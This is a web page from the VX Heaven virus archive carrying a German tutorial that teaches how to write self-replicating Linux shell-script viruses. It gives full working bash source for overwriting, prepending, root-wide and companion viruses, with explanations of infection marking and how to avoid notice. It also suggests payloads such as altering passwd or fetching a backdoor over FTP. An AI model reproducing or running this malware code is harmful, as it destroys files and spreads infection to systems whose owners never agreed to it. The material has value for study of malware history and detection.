<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SnakeByte 'Linux Shell Script Viren' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SnakeByte"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SnakeByte,Linux Shell Script Viren, file, sich, test, starten, root, savee, zeilen, windows, gibt, diese, beispiel, datei, dateien, code, script"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"2896261c8f4d27df3e2bf76194869bd8016b8bad-1498758103-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsn00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/lib/index.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Linux Shell Script Viren</h1><p><a href="/lib/?lang=de&amp;author=SnakeByte"> SnakeByte</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsn00.html';</script><div class="ci"><a href="/lib/?ci=vsn00">2</a></div>[<a style="" href="/lib/?lang=DE&amp;index=MA#vsn00">zurück zum Index</a>] [<a href="/lib/vsn00.html#disqus_thread">Kommentare</a>]<br/> 
<p>Immer wieder hört man von Linux Fanatikern, das es keine Linux Viren gibt. Nach einer längeren Diskussion, sehen diese dann meistens ein, das es welche gibt, nur das diese sich schwerer verbreiten können, das Linux die Zugriffsrechte und ähnliches auf Dateien strenger behandelt als Dos oder Windows 9x ( welche Zugriffsrechte *g* ). Zwar gibt es auch ELF Viren, die Exploits mit sich schleppen um Root Status zu bekommen, aber hier werde ich erstmal auf ganz einfache, Viren für Linux eingehen, die durchaus in der Lage sind sich effektiv zu verbreiten. Meiner Ansicht nach, werden Viren für Linux ein ähnliches Problem werden wie für Dos / Windows, da sich auch hier der Kommerz und mit ihm die Dau's breitmachen. Wo es Dau's gibt, gibt es schlecht konfigurierte Systeme und wo es die gibt, bleibt immer Platz für einen Virus. Ein weiterer Grund, warum ich auf Shell Script Viren eingehe und nicht auf ELF Infektoren, ist, das sie neben ihrer Einfachheit auch zu den meisten Unix'en kompatibel sein dürften, da die BASH eine der am häufigsten genutzten Shells ist. ( Inwiefern Bash Shellscript zu einer C oder sonstigen Shell kompatibel ist, weiß ich allerdings nicht.. ) Shell Scripte lassen sich mit den Batch Dateien von Dos oder den VB Script Dateien unter Windows vergleichen. Sie erlauben das Ausführen von Routinetätigkeiten durch Programme, die vom Betriebssystem ( oder eben der Shell ) interpretiert werden. Im Gegensatz zu Dos trifft man unter Linux relativ häufig auf Shell Scripte. Shell Scripte sind zum Beispiel : /etc/profile, /etc/csh.cshrc, Dateien in /etc/rc.d Dateien zum Konfigurieren der Firewall, etc, ... Für die die sich nicht mit Linux auskennen : mit 'vi' kann man wunderbar Textdateien editieren ( glaubt keinem, der meint emacs oder joe wären besser *g* ) und mit 'chmod &lt;Datei> +rwxrwxrwx' gibt man allen Gruppen Lese, Schreib und Ausführungs-Rechte für eine Datei. Über den Dateinamen kann man nun die Datei starten. (eventuell noch ein ./ vor den Dateinamen hängen)</p>
<p>Dies gibt einem Shell Script Virus eine breite Bandbreite an möglichen Opfern. Sehen wir uns doch einmal die simpelste Form eines Shell Script Viruses an:</p>
<pre class="source">
  #Overwritter I
  for file in *
   do
    cp $0 $file
   done
</pre>
<p>Dieses nur paar Zeilen lange Shell Script kopiert sich selber über alle Dateien, die es findet. Natürlich bringt so etwas eine Menge Datenverlust mit sich und dürfte relativ schnell auffallen, also müssen wir das Ganze geschickter anstellen:</p>
<pre class="source">
  #Overwritter II
  for file in *
   do
    if test -f $file
    then
     if test -x $file
     then
      if test -w $file
      then
       if grep -s echo $file >.mmm
       then
       cp $0 $file
  fi; fi; fi; fi; fi
  done
  rm .mmm -f
</pre>
<p>Hier machen wir ein paar extra Tests, bezüglich der Datei, die der Virus überschreibt. Zuerst testen wir ob es eine Datei ist, dann ob sie ausführbar ist und danach wird geprüft ob wir Schreibzugriff haben. Sind alle diese Kriterien erfüllt, dann durchsuchen wir die Datei nach dem echo Befehl. Ist dieser enthalten, können wir sicher sein, das wir eine Shell Script Datei infizieren. (Da dadurch leider viele Shell Scripte übergangen werden, kann man das eventuell auch über den "file" Befehl regeln : if file $file | grep -s 'Bourne shell script' > /dev/nul ; then ). Da nach dem Überschreiben eine solches Script nicht mehr die Funktion erfüllt, für die es vorgesehen war, sollten wir uns etwas anderes ausdenken, um unseren Virus in die Datei zu pflanzen. Der folgende Code ist ein Prepender, den ich vor ca. 2 Jahren geschrieben habe um zu sehen ob so etwas machbar ist.</p>
<pre class="source">
 # COCO
 head -n 24 $0 > .test
  for file in *
  do
   if test -f $file
   then
       if test -x $file
       then
            if test -w $file
            then
              if grep -s echo $file >.mmm
              then
                head -n 1 $file >.mm
                if grep -s COCO .mm >.mmm
                then
                rm .mm -f
                else
                 cat $file > .SAVEE
                 cat .test > $file
                 cat .SAVEE >> $file
   fi; fi; fi; fi; fi
 done
 rm .test .SAVEE .mmm .mm -f
</pre>
<p>Das # COCO dient dazu, das der Virus erkennt, ob eine Datei bereits infiziert ist. (if grep -s COCO .mm >.mmm überprüft dies ). Danach wieder die bereits bekannten Tests, ob die Datei ein potentielles Opfer ist. Ist die Datei nicht infiziert, dann kopieren wir sie in eine zweite, versteckte Datei (.SAVEE). Nun ersetzen wir die Zieldatei mit den ersten 24 Zeilen unserer Shell Script Datei, die wir vorher in .test gespeichert haben. ( Die ersten 24 Zeilen sind genau unser Virus) Nun hängen wir noch die Originaldatei an (cat .SAVEE >> $file ) und die Infektion ist kompeltt. Nun räumen wir noch alle Dateien auf, die wir während der Infektion erstellt haben. Nun können wir den Virus auch noch in zweierlei Hinsicht optimieren. Zum Einen in der Anzahl der Zeilen, zum Anderen in der Anzahl der verwendeten Dateien. (So oder so ähnlich sah die optimierte Version COCO 2 aus, die Anthraxx mal verbesserte, ich habe die Version von ihm leider nicht mehr)</p>
<pre class="source">
 # COCO ( 2 ? )
 for file in * ;  do
   if test -f $file &amp;&amp; test -x $file &amp;&amp; test -w $file ; then
    if grep -s echo $file > /dev/nul ; then
     head -n 1 $file >.mm
      if grep -s COCO .mm > /dev/nul ; then
       rm .mm -f ; else
        cat $file > .SAVEE
        head -n 13 $0 > $file
        cat .SAVEE >> $file
  fi; fi; fi
 done
 rm .SAVEE .mm -f
</pre>
<p>Hier brauchen wir nur noch 2 Dateien und 13 Zeilen Code. Natürlich könnte man durch zusammenlegen mehrerer Zeilen das Ganze in eine quetschen, aber dann ist der Code total unlesbar und deshalb werde ich hier darauf verzichten.</p>
<p>Was brauch ein Virus noch, damit er effektiv ist ? Er sollte nicht nur das momentane Verzeichnis infizieren, sondern auch andere. Man kann zum Beispiel in allen Verzeichnissen, die direkt über dem Root Verzeichnis liegen, nach Shell Scripten suchen ( etc, bin, sbin.. ) In diesem Beispiel speichern wir zuerst das aktuelle Verzeichnis, das in der Variable $pwd festgehalten wird. Danach suchen wir vom Root Verzeichnis aus, alle Verzeichnisse. Nun wechseln wir in das entsprechende Verzeichnis, infizieren alle Shell Scripte und wechseln wieder zum Root Verzeichnis. Am Ende stellen wir wieder das Originalverzeichnis her und räumen auf.</p>
<pre class="source">
 # COCO 3
 xtemp=$pwd
 head -n 22 $0 > /.test
 for dir in /* ; do
  if test -d $dir ; then
   cd $dir
   for file in * ; do
    if test -f $file &amp;&amp; test -x $file &amp;&amp; test -w $file ; then
     if grep -s echo $file > /dev/nul ; then
       head -n 1 $file > .mm
       if grep -s COCO .mm > /dev/nul ; then
        rm .mm -f ; else
         cat $file > /.SAVEE
         cat /.test > $file
         cat /.SAVEE >> $file
    fi; fi; fi
   done
   cd ..
  fi
 done
 cd $xtemp
 rm /.test /.SAVEE .mm -f
</pre>
<p>An sich schonmal nicht schlecht für so etwas simples wie ein Shell Script, oder? Natürlich könnte man nun anfangen gezielt nach Verzeichnissen suchen, einen Payload einzubauen ( Message, passwd erweitern *g*, Dauerping auf irgendeinen Rechner starten, per FTP eine Backdoor runterladen und starten, etc... ), aber hier will ich es dabei belassen. Was mit Sicherheit auch möglich ist, ist den Virus über Mail an andere Rechner zu schicken ( Sendmail und Co kann man wohl auch über Kommandozeile starten ) aber solange die Mehrheit Windows benutzt, wird dies wohl nicht sehr effektiv sein. Um die Sache rund zu machen, hier noch ein Compagnion Virus:</p>
<pre class="source">
 # Compagnion
 for file in * ;  do
   if test -f $file &amp;&amp; test -x $file &amp;&amp; test -w $file ; then
    if file $file | grep -s 'ELF' > /dev/nul ; then
     mv $file .$file
     head -n 9 $0 > $file
  fi; fi
 done
 .$0
</pre>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsn00">de</a><a href="/lib/index.php?lang=en&amp;id=vsn00">en</a><a href="/lib/index.php?lang=es&amp;id=vsn00">es</a><a href="/lib/index.php?lang=it&amp;id=vsn00">it</a><a href="/lib/index.php?lang=fr&amp;id=vsn00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsn00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsn00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsn00">ua</a></div>
</body>
</html>
